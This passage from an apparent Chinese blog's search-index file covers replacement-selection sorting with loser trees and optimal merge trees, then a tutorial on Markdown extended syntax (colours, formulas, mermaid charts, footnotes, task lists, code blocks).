<li>重复 2—6，直至内存工作为空，由此就可以得到全部的初始归并段。</li>
</ol>
<p>拿图 1 中的初始文件为例，首先输入前 6 个记录到内存工作区，其中关键字最小的为 29，所以选其为 MINIMAX 记录，同时将其输出到归并段文件中，如下图所示：<br><img src="http://c.biancheng.net/uploads/allimg/190427/1100444232-1.png" alt=""></p>
<p>此时初始文件不为空，所以从中输入下一个记录 14 到内存工作区中，然后从内存工作区中的比 29 大的记录中，选择一个最小值作为新的 MINIMAX 值输出到 归并段文件中，如下图所示：<br><img src="http://c.biancheng.net/uploads/allimg/190427/1100443O6-2.png" alt=""></p>
<p>初始文件还不为空，所以继续输入 61 到内存工作区中，从内存工作区中的所有关键字比 38 大的记录中，选择一个最小值作为新的 MINIMAX 值输出到归并段文件中，如下图所示：<br><img src="http://c.biancheng.net/uploads/allimg/190427/1100441W3-3.png" alt=""></p>
<p>如此重复性进行，直至选不出 MINIMAX 值为止，如下图所示：<br><img src="http://c.biancheng.net/uploads/allimg/190427/1100444T0-4.png" alt=""></p>
<p>当选不出 MINIMAX 值时，表示一个归并段已经生成，则开始下一个归并段的创建，创建过程同第一个归并段一样，这里不再赘述。</p>
<h4 id="败者树实现"><a href="#败者树实现" class="headerlink" title="败者树实现"></a>败者树实现</h4><p>在上述创建初始段文件的过程中，需要不断地在内存工作区中选择新的 MINIMAX 记录，即选择不小于旧的 MINIMAX 记录的最小值，此过程需要利用“败者树”来实现。<br>　　<br>同上一节所用到的败者树不同的是，在不断选择新的 MINIMAX 记录时，为了防止新加入的关键字值小的的影响，每个叶子结点附加一个序号位，当进行关键字的比较时，先比较序号，序号小的为胜者；序号相同的关键字值小的为胜者。<br>　　<br>在初期创建败者树时也可以通过不断调整败者树的方式，其中所有记录的序号均设为 0 ，然后从初始文件中逐个输入记录到内存工作区中，自下而上调整败者树。过程如下：</p>
<ol>
<li>首先创建一个空的败者树，如下图所示：<br><img src="https://c.biancheng.net/uploads/allimg/190427/1100442Q8-5.png" alt=""><br>提示：败者树根结点上方的方框内表示的为最终的胜者所处的位置。</li>
<li>从初始文件中读入关键字为 51 的记录，自下往上调整败者树，如下图所示：<br><img src="https://c.biancheng.net/uploads/allimg/190427/110044CX-6.png" alt=""><br>提示：序号 1 为败者。 先比较序号，序号小的为胜者；序号相同的关键字值小的为胜者。</li>
<li>从初始文件中读入关键字为 49 的记录，调整败者树如下图所示：<br><img src="https://c.biancheng.net/uploads/allimg/190427/1100444218-7.png" alt="">   </li>
<li>从初始文件依次读入关键字为 39、46、38、29 的记录，调整败者树如下图所示：  <pre><code>![](http://c.biancheng.net/uploads/allimg/190427/1100444F4-8.png)
</code></pre></li>
</ol>
<p>由败者树得知，其最终胜者为 29，设为 MINIMAX 值，将其输出到初始归并文件中，同时再读入下一个记录 14，调整败者树，如下图所示：<br><img src="http://c.biancheng.net/uploads/allimg/190427/1100442U0-9.png" alt=""></p>
<p>注意：当读入新的记录时，如果其值比 MINIMAX 大，其序号则仍为 1；反之则为 2 ，比较时先比较序号，序号小的为胜者；序号相同的关键字值小的为胜者。。</p>
<p>通过不断地向败者树中读入记录，会产生多个 MINIMAX，直到最终所有叶子结点中的序号都为 2，此时产生的新的 MINIMAX 值的序号 2，表明此归并段生成完成，而此新的 MINIMAX 值就是下一个归并段中的第一个记录。</p>
<p>通过置换选择排序算法得到的初始归并段，其长度并不会受内存容量的限制，且通过证明得知使用该方法所获得的归并段的平均长度为内存工作区大小的两倍。</p>
<p><strong>通过对初始文件进行置换选择排序能够获得多个长度不等的初始归并段</strong></p>
<blockquote>
<p>证明此结论的方法是 E.F.Moore（人名）在 1961 年从置换—选择排序和扫雪机的类比中得出的，有兴趣的可以自己了解一下。</p>
</blockquote>
<p>若不计输入输出的时间，通过置换选择排序生成初始归并段的所需时间为<strong><code>O(nlogw)</code>（其中 n 为记录数，w 为内存工作区的大小）</strong>。</p>
<h3 id="（六）最佳归并树详解"><a href="#（六）最佳归并树详解" class="headerlink" title="（六）最佳归并树详解"></a>（六）最佳归并树详解</h3><h4 id="1-哈夫曼树"><a href="#1-哈夫曼树" class="headerlink" title="1. 哈夫曼树"></a>1. 哈夫曼树</h4><p>通过上一节对置换-选择排序算法的学习了解到，<strong>通过对初始文件进行置换选择排序能够获得多个长度不等的初始归并段</strong>，相比于按照内存容量大小对初始文件进行等分，大大减少了初始归并段的数量，从而提高了外部排序的整体效率。</p>
<p>本节带领大家思考一个问题：<strong>无论是通过等分还是置换-选择排序得到的归并段，如何设置它们的归并顺序，可以使得对外存的访问次数降到最低</strong>？</p>
<p>例如，现有通过置换选择排序算法所得到的 9 个初始归并段，其长度分别为：<code>9，30，12，18，3，17，2，6，24</code>。在对其采用 3-路平衡归并的方式时可能出现如图 1 所示的情况：<br><img src="http://c.biancheng.net/uploads/allimg/190427/11012121F-0.png" alt=""><br>图 1 3-路平衡归并</p>
<blockquote>
<p>提示：图 1 中的叶子结点表示初始归并段，各自包含记录的长度用结点的权重来表示；非终端结点表示归并后的临时文件。</p>
</blockquote>
<p>假设在进行平衡归并时，操作每个记录都需要单独进行一次对外存的读写，那么图 1 <strong>中的归并过程需要对外存进行读或者写的次数为</strong>：（9+30+12+18+3+17+2+6+24）<em>2</em>2=484（图 1 中涉及到了两次归并，对外存的读和写各进行 2 次）从计算结果上看，对于图 1 中的 3 叉树来讲，其操作外存的次数恰好是树的带权路径长度的 2 倍。所以，<strong>对于如何减少访问外存的次数的问题，就等同于考虑如何使 k-路归并所构成的 k 叉树的带权路径长度最短。**</strong>若想使树的带权路径长度最短，就是构造赫夫曼树。**</p>
<blockquote>
<p>在学习赫夫曼树时，只是涉及到了带权路径长度最短的二叉树为赫夫曼树，其实扩展到一般情况，对于 k 叉树，只要其带权路径长度最短，亦可以称为赫夫曼树。</p>
</blockquote>
<p>若对上述 9 个初始归并段构造一棵赫夫曼树作为归并树，如图 2 所示：<br><img src="http://c.biancheng.net/uploads/allimg/190427/1101213M7-1.png" alt=""><br>图 2 赫夫曼树作为3-路归并树</p>
<p>依照图 2 所示，其对外存的读写次数为：(2<em>3+3</em>3+6<em>3+9</em>2+12<em>2+17</em>2+18<em>2+24</em>2+30)*2=446</p>
<p><strong>通过以构建赫夫曼树的方式构建归并树，使其对读写外存的次数降至最低（k-路平衡归并，需要选取合适的 k 值，构建赫夫曼树作为归并树）。所以称此归并树为最佳归并树。</strong></p>
<h4 id="2-附加“虚段”的归并树"><a href="#2-附加“虚段”的归并树" class="headerlink" title="2. 附加“虚段”的归并树"></a>2. 附加“虚段”的归并树</h4><p>上述图 2 中所构建的为一颗真正的 3叉树（树中各结点的度不是 3 就是 0），而若 9 个初始归并段改为 8 个，在做 3-路平衡归并的时候就需要有一个结点的度为 2。</p>
<p>对于具体设置哪个结点的度为 2，为了使总的带权路径长度最短，正确的选择方法是：附加一个权值为 0 的结点（称为“虚段”），然后再构建赫夫曼树。例如图 2 中若去掉权值为 30 的结点，其附加虚段的最佳归并树如图 3 所示：</p>
<p><img src="http://c.biancheng.net/uploads/allimg/190427/1101211635-2.png" alt=""><br>图 3 附加虚段的最佳归并树</p>
<blockquote>
<p>注意：虚段的设置只是为了方便构建赫夫曼树，在构建完成后虚段自动去掉即可。</p>
</blockquote>
<p><strong>对于如何判断是否需要增加虚段，以及增加多少虚段的问题，有以下结论直接套用即可：在一般情况下，对于 k–路平衡归并来说，若 (m-1) MOD (k-1) = 0，则不需要增加虚段；否则需附加 k - (m-1)MOD(k-1) - 1 个虚段。</strong> </p>
]]></content>
      <categories>
        <category>Algorithms</category>
      </categories>
      <tags>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown拓展语法学习</title>
    <url>/2025/01/20/markdown_4/</url>
    <content><![CDATA[<h1 id="设计字体、字号和颜色"><a href="#设计字体、字号和颜色" class="headerlink" title="设计字体、字号和颜色"></a>设计字体、字号和颜色</h1><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;font face=&#x27;黑体&#x27; color=#ff0000 size=4&gt;我是正文&lt;/font&gt;</span><br></pre></td></tr></table></figure>
<p><font face='黑体' color=#ff0000 size=4>我是正文</font></p>
<h4 id="RGB颜色值与十六进制颜色码对照表"><a href="#RGB颜色值与十六进制颜色码对照表" class="headerlink" title="RGB颜色值与十六进制颜色码对照表"></a><a href="https://www.cnblogs.com/remember-forget/p/8134849.html" title="发布于 2017-12-28 11:34">RGB颜色值与十六进制颜色码对照表</a></h4><span id="more"></span>
<h1 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h1><p>你可以在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。下面每种写法都可以建立分隔线：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">* * *  </span><br><span class="line">***  </span><br><span class="line">**********  </span><br><span class="line">- - -  </span><br><span class="line">_________________  </span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">效果如下：</span><br><span class="line">* * *  </span><br><span class="line">***  </span><br><span class="line">**********  </span><br><span class="line">- - -  </span><br><span class="line">_________________  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 为文字添加背景色</span><br><span class="line"></span><br><span class="line">由于 style 标签和标签的 style 属性不被支持，所以这里只能是借助 table, tr, td 等表格标签的 bgcolor 属性来实现背景色。故这里对于文字背景色的设置，只是将那一整行看作一个表格，更改了那个格子的背景色（bgcolor）。 语法：</span><br><span class="line"></span><br><span class="line">```text  </span><br><span class="line">&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=yellow&gt;背景色yellow&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;  </span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=yellow&gt;背景色yellow&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 设置文字居中</span><br><span class="line"></span><br><span class="line">```text  </span><br><span class="line">&lt;center&gt;居中&lt;/center&gt;  </span><br><span class="line">&lt;p align=&quot;left&quot;&gt;左对齐&lt;/p&gt;  </span><br><span class="line">&lt;p align=&quot;right&quot;&gt;右对齐&lt;/p&gt;  </span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">效果如下：</span><br><span class="line">&lt;center&gt;居中&lt;/center&gt;  </span><br><span class="line">&lt;p align=&quot;left&quot;&gt;左对齐&lt;/p&gt;  </span><br><span class="line">&lt;p align=&quot;right&quot;&gt;右对齐&lt;/p&gt;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 加入上下标</span><br><span class="line"></span><br><span class="line">使用HTML中下标下标的语法即可, 语法：</span><br><span class="line"></span><br><span class="line">```text  </span><br><span class="line">H&lt;sub&gt;2&lt;/sub&gt;O  CO&lt;sub&gt;2&lt;/sub&gt;  </span><br><span class="line">爆米&lt;sup&gt;TM&lt;/sup&gt;  </span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">H&lt;sub&gt;2&lt;/sub&gt;O  CO&lt;sub&gt;2&lt;/sub&gt;  </span><br><span class="line">爆米&lt;sup&gt;TM&lt;/sup&gt;</span><br><span class="line"></span><br><span class="line">一些Markdown处理器允许您创建术语及其对应定义的_定义列表_。要创建定义列表，请在第一行上键入术语。在下一行，键入一个冒号，后跟一个空格和定义。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>First Term<br>: This is the definition of the first term.</p>
<p>Second Term<br>: This is one definition of the second term.<br>: This is another definition of the second term.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">HTML看起来像这样：</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p><dl><br>  <dt>First Term</dt><br>  <dd>This is the definition of the first term.</dd><br>  <dt>Second Term</dt><br>  <dd>This is one definition of the second term. </dd><br>  <dd>This is another definition of the second term.</dd><br></dl><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">呈现的输出如下所示：</span><br><span class="line"></span><br><span class="line">First Term</span><br><span class="line"></span><br><span class="line">This is the definition of the first term.</span><br><span class="line"></span><br><span class="line">Second Term</span><br><span class="line"></span><br><span class="line">This is one definition of the second term.</span><br><span class="line"></span><br><span class="line">This is another definition of the second term.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 公式</span><br><span class="line"></span><br><span class="line">**Markdown Preview Enhanced** 使用 [KaTeX](https://github.com/Khan/KaTeX) 或者 [MathJax](https://github.com/mathjax/MathJax) 来渲染数学表达式。</span><br><span class="line"></span><br><span class="line">KaTeX 拥有比 MathJax 更快的性能，但是它却少了很多 MathJax 拥有的特性。你可以查看 KaTeX supported functions/symbols 来了解 KaTeX 支持那些符号和函数。</span><br><span class="line"></span><br><span class="line">默认下的分隔符：</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<ul>
<li><code>$...$</code> 或者 <code>\(...\)</code> 中的数学表达式将会在行内显示。</li>
<li><code>$$...$$</code> 或者 <code>\[...\]</code> 或者 <code>``</code>math ` 中的数学表达式将会在块内显示。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![](https://www.runoob.com/wp-content/uploads/2019/03/0e408954-fda8-11e5-9eb4-562d7c0ca431.gif)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
$$<br>\begin{Bmatrix}<br> a &amp; b \<br> c &amp; d<br>\end{Bmatrix}<br>$$<br>$$<br>\begin{CD}<br> A @&gt;a&gt;&gt; B \<br>@VbVV @AAcA \<br> C @= D<br>\end{CD}<br>$$<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出结果为：</span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line">\begin&#123;Bmatrix&#125;</span><br><span class="line">a &amp; b \\</span><br><span class="line">c &amp; d</span><br><span class="line">\end&#123;Bmatrix&#125;</span><br><span class="line">$$</span><br><span class="line">$$</span><br><span class="line">\begin&#123;CD&#125;</span><br><span class="line">A @&gt;a&gt;&gt; B \\</span><br><span class="line">@VbVV @AAcA \\</span><br><span class="line">C @= D</span><br><span class="line">\end&#123;CD&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line">\begin&#123;pmatrix&#125;</span><br><span class="line">1 &amp; a_1 &amp; a_1^2 &amp; \cdots &amp; a_1^n \\</span><br><span class="line">1 &amp; a_2 &amp; a_2^2 &amp; \cdots &amp; a_2^n \\</span><br><span class="line">\vdots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\</span><br><span class="line">1 &amp; a_m &amp; a_m^2 &amp; \cdots &amp; a_m^n \\</span><br><span class="line">\end&#123;pmatrix&#125;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 画流程图、时序图、甘特图</span><br><span class="line">## 1、横向流程图源码格式</span><br><span class="line"></span><br></pre></td></tr></table></figure>
graph LR<br>A[方形] –&gt;B(圆角)<br>  B –&gt; C{条件a}<br>  C –&gt;|a=1| D[结果1]<br>  C –&gt;|a=2| E[结果2]<br>  F[横向流程图]<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## 2、竖向流程图源码格式</span><br><span class="line"></span><br></pre></td></tr></table></figure>
graph TD<br>A[方形] –&gt; B(圆角)<br>  B –&gt; C{条件a}<br>  C –&gt; |a=1| D[结果1]<br>  C –&gt; |a=2| E[结果2]<br>  F[竖向流程图]<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## 3、UML标准时序图样例</span><br><span class="line"></span><br></pre></td></tr></table></figure>
%% 时序图例子,-&gt; 直线，–&gt;虚线，-&gt;&gt;实线箭头<br>sequenceDiagram<br>  participant 张三<br>  participant 李四<br>  张三-&gt;王五: 王五你好吗？<br>  loop 健康检查<pre><code>王五-&gt;王五: 与疾病战斗
</code></pre>  end<br>  Note right of 王五: 合理 食物 <br/>看医生…<br>  李四–&gt;&gt;张三: 很好!<br>  王五-&gt;李四: 你怎么样?<br>  李四–&gt;王五: 很好!<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## 4、甘特图样例</span><br><span class="line"></span><br></pre></td></tr></table></figure>
%% 语法示例<pre><code>gantt
dateFormat  YYYY-MM-DD
title 软件开发甘特图
section 设计
需求                      :done,    des1, 2014-01-06,2014-01-08
原型                      :active,  des2, 2014-01-09, 3d
UI设计                     :         des3, after des2, 5d
</code></pre>  未来任务                     :         des4, after des3, 5d<pre><code>section 开发
学习准备理解需求                      :crit, done, 2014-01-06,24h
设计框架                             :crit, done, after des2, 2d
开发                                 :crit, active, 3d
未来任务                              :crit, 5d
耍                                   :2d
section 测试
功能测试                              :active, a1, after des3, 3d
压力测试                               :after a1  , 20h
测试报告                               : 48h
</code></pre><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"># 效果图如下</span><br><span class="line"></span><br><span class="line">## 1、横向流程图源码格式</span><br><span class="line"></span><br><span class="line">```mermaid</span><br><span class="line">graph LR</span><br><span class="line">A[方形] --&gt;B(圆角)</span><br><span class="line">    B --&gt; C&#123;条件a&#125;</span><br><span class="line">    C --&gt;|a=1| D[结果1]</span><br><span class="line">    C --&gt;|a=2| E[结果2]</span><br><span class="line">    F[横向流程图]</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="2、竖向流程图源码格式"><a href="#2、竖向流程图源码格式" class="headerlink" title="2、竖向流程图源码格式"></a>2、竖向流程图源码格式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph TD</span><br><span class="line">A[方形] --&gt; B(圆角)</span><br><span class="line">    B --&gt; C&#123;条件a&#125;</span><br><span class="line">    C --&gt; |a=1| D[结果1]</span><br><span class="line">    C --&gt; |a=2| E[结果2]</span><br><span class="line">    F[竖向流程图]</span><br></pre></td></tr></table></figure>
<h2 id="3、UML标准时序图"><a href="#3、UML标准时序图" class="headerlink" title="3、UML标准时序图"></a>3、UML标准时序图</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%% 时序图例子,-&gt; 直线，--&gt;虚线，-&gt;&gt;实线箭头</span><br><span class="line">  sequenceDiagram</span><br><span class="line">    participant 张三</span><br><span class="line">    participant 李四</span><br><span class="line">    张三-&gt;王五: 王五你好吗？</span><br><span class="line">    loop 健康检查</span><br><span class="line">        王五-&gt;王五: 与疾病战斗</span><br><span class="line">    end</span><br><span class="line">    Note right of 王五: 合理 食物 &lt;br/&gt;看医生...</span><br><span class="line">    李四--&gt;&gt;张三: 很好!</span><br><span class="line">    王五-&gt;李四: 你怎么样?</span><br><span class="line">    李四--&gt;王五: 很好!</span><br></pre></td></tr></table></figure>
<h2 id="4、甘特图"><a href="#4、甘特图" class="headerlink" title="4、甘特图"></a>4、甘特图</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%% 语法示例</span><br><span class="line">        gantt</span><br><span class="line">        dateFormat  YYYY-MM-DD</span><br><span class="line">        title 软件开发甘特图</span><br><span class="line">        section 设计</span><br><span class="line">        需求                      :done,    des1, 2014-01-06,2014-01-08</span><br><span class="line">        原型                      :active,  des2, 2014-01-09, 3d</span><br><span class="line">        UI设计                     :         des3, after des2, 5d</span><br><span class="line">    未来任务                     :         des4, after des3, 5d</span><br><span class="line">        section 开发</span><br><span class="line">        学习准备理解需求                      :crit, done, 2014-01-06,24h</span><br><span class="line">        设计框架                             :crit, done, after des2, 2d</span><br><span class="line">        开发                                 :crit, active, 3d</span><br><span class="line">        未来任务                              :crit, 5d</span><br><span class="line">        耍                                   :2d</span><br><span class="line">        section 测试</span><br><span class="line">        功能测试                              :active, a1, after des3, 3d</span><br><span class="line">        压力测试                               :after a1  , 20h</span><br><span class="line">        测试报告                               : 48h</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">timeline LR</span><br><span class="line">    title GPT-Academic项目发展历程</span><br><span class="line">    section 2.x</span><br><span class="line">        1.0~2.2: 基础功能: 引入模块化函数插件: 可折叠式布局: 函数插件支持热重载</span><br><span class="line">        2.3~2.5: 增强多线程交互性: 新增PDF全文翻译功能: 新增输入区切换位置的功能: 自更新</span><br><span class="line">        2.6: 重构了插件结构: 提高了交互性: 加入更多插件</span><br><span class="line">    section 3.x</span><br><span class="line">        3.0~3.1: 对chatglm支持: 对其他小型llm支持: 支持同时问询多个gpt模型: 支持多个apikey负载均衡</span><br><span class="line">        3.2~3.3: 函数插件支持更多参数接口: 保存对话功能: 解读任意语言代码: 同时询问任意的LLM组合: 互联网信息综合功能</span><br><span class="line">        3.4: 加入arxiv论文翻译: 加入latex论文批改功能</span><br><span class="line">        3.44: 正式支持Azure: 优化界面易用性</span><br><span class="line">        3.46: 自定义ChatGLM2微调模型: 实时语音对话</span><br><span class="line">        3.49: 支持阿里达摩院通义千问: 上海AI-Lab书生: 讯飞星火: 支持百度千帆平台 &amp; 文心一言</span><br><span class="line">        3.50: 虚空终端: 支持插件分类: 改进UI: 设计新主题</span><br><span class="line">        3.53: 动态选择不同界面主题: 提高稳定性: 解决多用户冲突问题</span><br><span class="line">        3.55: 动态代码解释器: 重构前端界面: 引入悬浮窗口与菜单栏</span><br><span class="line">        3.56: 动态追加基础功能按钮: 新汇报PDF汇总页面</span><br><span class="line">        3.57: GLM3, 星火v3: 支持文心一言v4: 修复本地模型的并发BUG</span><br><span class="line">        3.60: 引入AutoGen</span><br><span class="line">        3.70: 引入Mermaid绘图: 实现GPT画脑图等功能</span><br><span class="line">        3.80(TODO): 优化AutoGen插件主题: 设计衍生插件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h1><p>脚注使您可以添加注释和参考，而不会使文档正文混乱。当您创建脚注时，带有脚注的上标数字会出现在您添加脚注参考的位置。读者可以单击链接以跳至页面底部的脚注内容。</p>
<p>要创建脚注参考，请在方括号（<code>[^1]</code>）内添加插入符号和标识符。标识符可以是数字或单词，但不能包含空格或制表符。标识符仅将脚注参考与脚注本身相关联-在输出中，脚注按顺序编号。</p>
<p>在括号内使用另一个插入符号和数字添加脚注，并用冒号和文本（<code>[^1]: My footnote.</code>）。您不必在文档末尾添加脚注。您可以将它们放在除列表，块引号和表之类的其他元素之外的任何位置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Here&#x27;s a simple footnote,[^1] and here&#x27;s a longer one.[^bignote]</span><br><span class="line"></span><br><span class="line">[^1]: This is the first footnote.</span><br><span class="line"></span><br><span class="line">[^bignote]: Here&#x27;s one with multiple paragraphs and code.</span><br><span class="line"></span><br><span class="line">    Indent paragraphs to include them in the footnote.</span><br><span class="line"></span><br><span class="line">    `&#123; my code &#125;`</span><br><span class="line"></span><br><span class="line">    Add as many paragraphs as you like.</span><br></pre></td></tr></table></figure>
<p>呈现的输出如下所示：</p>
<p>Here’s a simple footnote,[^1] and here’s a longer one.[^bignote]</p>
<p>[^1]: This is the first footnote.</p>
<p>[^bignote]: Here’s one with multiple paragraphs and code.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Indent paragraphs to include them in the footnote.</span><br><span class="line"></span><br><span class="line">`&#123; my code &#125;`</span><br><span class="line"></span><br><span class="line">Add as many paragraphs as you like.</span><br></pre></td></tr></table></figure>
<h1 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a>任务列表</h1><p>任务列表使您可以创建带有复选框的项目列表。在支持任务列表的Markdown应用程序中，复选框将显示在内容旁边。要创建任务列表，请在任务列表项之前添加破折号<code>-</code>和方括号<code>[ ]</code>，并在<code>[ ]</code>前面加上空格。要选择一个复选框，请在方括号<code>[x]</code>之间添加 x 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- [x] Write the press release</span><br><span class="line">- [ ] Update the website</span><br><span class="line">- [ ] Contact the media</span><br></pre></td></tr></table></figure>
<p>呈现的输出如下所示：</p>
<ul>
<li>[x] Write the press release</li>
<li>[ ] Update the website</li>
<li>[ ] Contact the media</li>
</ul>
<h1 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a>删除线</h1><p>您可以通过在单词中心放置一条水平线来删除单词。结果看起来<del>像这样</del>。此功能使您可以指示某些单词是一个错误，要从文档中删除。若要删除单词，请在单词前后使用两个波浪号<code>~~</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~~世界是平坦的。~~ 我们现在知道世界是圆的。</span><br></pre></td></tr></table></figure>
<p>呈现的输出如下所示：</p>
<p><del>世界是平坦的。</del> 我们现在知道世界是圆的。</p>
<h1 id="使用-Emoji-表情"><a href="#使用-Emoji-表情" class="headerlink" title="使用 Emoji 表情"></a>使用 Emoji 表情</h1><p>有两种方法可以将表情符号添加到Markdown文件中：将表情符号复制并粘贴到Markdown格式的文本中，或者键入<em>emoji shortcodes</em>。</p>
<h2 id="复制和粘贴表情符号"><a href="#复制和粘贴表情符号" class="headerlink" title="复制和粘贴表情符号"></a>复制和粘贴表情符号</h2><p>在大多数情况下，您可以简单地从<a href="https://emojipedia.org/">Emojipedia (opens new window)</a>等来源复制表情符号并将其粘贴到文档中。许多Markdown应用程序会自动以Markdown格式的文本显示表情符号。从Markdown应用程序导出的HTML和PDF文件应显示表情符号。</p>
<p><strong>Tip:</strong> 如果您使用的是静态网站生成器，请确保将HTML页面编码为UTF-8。.</p>
<h2 id="使用表情符号简码"><a href="#使用表情符号简码" class="headerlink" title="使用表情符号简码"></a>使用表情符号简码</h2><p>一些Markdown应用程序允许您通过键入表情符号短代码来插入表情符号。这些以冒号开头和结尾，并包含表情符号的名称。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">去露营了！ :tent: 很快回来。</span><br><span class="line"></span><br><span class="line">真好笑！ :joy:</span><br></pre></td></tr></table></figure>
<p>呈现的输出如下所示：</p>
<p>去露营了！⛺很快回来。</p>
<p>真好笑！😂</p>
<p><strong>Note:</strong> 注意：您可以使用此<a href="https://gist.github.com/rxaviers/7360908">表情符号简码列表</a>，但请记住，表情符号简码因应用程序而异。有关更多信息，请参阅Markdown应用程序的文档。</p>
<h1 id="围栏代码块"><a href="#围栏代码块" class="headerlink" title="围栏代码块"></a>围栏代码块</h1><p>Markdown基本语法允许您通过将行缩进四个空格或一个制表符来创建<a href="https://markdown.com.cn/basic-syntax/code-blocks.html">代码块</a>。如果发现不方便，请尝试使用受保护的代码块。根据Markdown处理器或编辑器的不同，您将在代码块之前和之后的行上使用三个反引号（(<code>``</code> `）或三个波浪号（~~~）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line">&#123;</span><br><span class="line">  &quot;firstName&quot;: &quot;John&quot;,</span><br><span class="line">  &quot;lastName&quot;: &quot;Smith&quot;,</span><br><span class="line">  &quot;age&quot;: 25</span><br><span class="line">&#125;</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
<p>呈现的输出如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;firstName&quot;: &quot;John&quot;,</span><br><span class="line">  &quot;lastName&quot;: &quot;Smith&quot;,</span><br><span class="line">  &quot;age&quot;: 25</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Tip:</strong>要在代码块中显示反引号？请参阅了解如何<a href="https://markdown.com.cn/basic-syntax/escaping-backticks.html">转义</a>它们。</p>
<h2 id="语法高亮"><a href="#语法高亮" class="headerlink" title="语法高亮"></a>语法高亮</h2><p>许多Markdown处理器都支持受围栏代码块的语法突出显示。使用此功能，您可以为编写代码的任何语言添加颜色突出显示。要添加语法突出显示，请在受防护的代码块之前的反引号旁边指定一种语言。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">```json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;firstName&quot;: &quot;John&quot;,</span><br><span class="line">  &quot;lastName&quot;: &quot;Smith&quot;,</span><br><span class="line">  &quot;age&quot;: 25</span><br><span class="line">&#125;</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
<p>呈现的输出如下所示：</p>
<p>{ “firstName”: “John”, “lastName”: “Smith”, “age”: 25 }</p>
<h1 id="自动网址链接"><a href="#自动网址链接" class="headerlink" title="自动网址链接"></a>自动网址链接</h1><p>许多Markdown处理器会自动将URL转换为链接。这意味着如果您输入<a href="http://www.example.com，即使您未[使用方括号](https://markdown.com.cn/basic-syntax/links.html)，您的Markdown处理器也会自动将其转换为链接。">http://www.example.com，即使您未[使用方括号](https://markdown.com.cn/basic-syntax/links.html)，您的Markdown处理器也会自动将其转换为链接。</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.example.com</span><br></pre></td></tr></table></figure>
<p>呈现的输出如下所示：</p>
<p><a href="http://www.example.com/">http://www.example.com(opens new window)</a></p>
<h2 id="禁用自动URL链接"><a href="#禁用自动URL链接" class="headerlink" title="禁用自动URL链接"></a>禁用自动URL链接</h2><p>如果您不希望自动链接URL，则可以通过将URL表示为带反引号的代码来删除该链接。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`http://www.example.com`</span><br></pre></td></tr></table></figure>
<p>呈现的输出如下所示：</p>
<p><code>http://www.example.com</code></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown基本语法学习</title>
    <url>/2025/01/19/markdown_3/</url>
    <content><![CDATA[<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>要将单词或短语表示为代码，请将其包裹在反引号 (<code>`</code>) 中。</p>
<table>
<thead>
